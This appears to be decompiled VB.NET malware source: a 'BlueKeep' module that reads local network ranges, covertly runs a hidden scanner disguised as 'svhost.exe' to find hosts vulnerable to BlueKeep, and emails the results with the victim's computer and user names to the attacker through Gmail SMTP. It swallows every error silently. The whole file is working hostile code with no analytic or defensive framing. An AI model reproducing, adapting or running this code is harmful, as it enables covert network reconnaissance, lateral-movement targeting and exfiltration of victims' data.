Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Net
Imports System.Net.Mail

Namespace Main.Tools
	' Token: 0x0200000D RID: 13
	Friend Class BlueKeep
		' Token: 0x06000040 RID: 64 RVA: 0x0000561C File Offset: 0x0000381C
		Public Sub BlueKeepStart()
			Try
				Dim list As List(Of List(Of String)) = New List(Of List(Of String))()
				list = New EternalBlueToolkit().GrabInfo()
				Me._adapters = list(0)
				Me._startingAddress = list(1)
				Me._endingAddress = list(2)
				For i As Integer = 0 To Me._adapters.Count - 1
					Me.SearchAndDestroy(Me._startingAddress(i), Me._endingAddress(i))
				Next
			Catch
			End Try
		End Sub

		' Token: 0x06000041 RID: 65 RVA: 0x000056B0 File Offset: 0x000038B0
		Private Sub SearchAndDestroy(startingAddress As String, endingAddress As String)
			Try
				Dim process As Process = New Process()
				process.StartInfo.UseShellExecute = False
				process.StartInfo.RedirectStandardOutput = True
				process.StartInfo.FileName = "cmd.exe"
				process.StartInfo.Arguments = "/c svhost.exe " + startingAddress + "-" + endingAddress
				process.StartInfo.CreateNoWindow = True
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
				process.Start()
				Dim text As String = process.StandardOutput.ReadToEnd()
				process.WaitForExit()
				If text <> String.Empty Then
					Me.BlueKeepEmail(text)
				Else
					Me.BlueKeepEmail("No vulnerable hosts were found!")
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000042 RID: 66 RVA: 0x00005770 File Offset: 0x00003970
		Private Sub BlueKeepEmail(vulnerableTargets As String)
			Try
				Dim mailMessage As MailMessage = New MailMessage()
				Dim smtpClient As SmtpClient = New SmtpClient("smtp.gmail.com")
				mailMessage.From = New MailAddress(Config.SmtpServerData.SelectedMailFrom)
				mailMessage.[To].Add(Config.SmtpServerData.SelectedMailTo)
				mailMessage.Subject = "BlueKeep Vulnerability Summary!"
				mailMessage.Body = String.Concat(New String() { vbLf & vbLf & "Report from the following host: " & vbLf & vbLf & "Computer Name: ", Environment.MachineName, vbLf & "User Name: ", Environment.UserName, vbLf & vbLf & "Vulnerable IP Address(es) information:" & vbLf & vbLf, vulnerableTargets })
				smtpClient.Port = 587
				smtpClient.Credentials = New NetworkCredential(Config.SmtpServerData.SelectedUsername, Config.SmtpServerData.SelectedPassword)
				smtpClient.EnableSsl = True
				smtpClient.Send(mailMessage)
			Catch
			End Try
		End Sub

		' Token: 0x04000080 RID: 128
		Private _adapters As List(Of String) = New List(Of String)()

		' Token: 0x04000081 RID: 129
		Private _endingAddress As List(Of String) = New List(Of String)()

		' Token: 0x04000082 RID: 130
		Private _startingAddress As List(Of String) = New List(Of String)()
	End Class
End Namespace
